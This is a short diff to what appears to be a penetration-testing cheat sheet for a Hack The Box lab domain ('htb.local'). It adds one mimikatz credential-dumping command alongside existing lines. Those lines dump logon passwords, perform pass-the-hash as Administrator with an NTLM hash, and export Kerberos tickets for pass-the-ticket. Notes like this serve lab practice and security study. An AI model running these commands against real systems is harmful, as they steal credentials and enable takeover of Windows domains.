@@ -608,6 +608,7 @@ cd /opt/mimikatz/x64
 
 # PTH
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
 #PTT
 .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
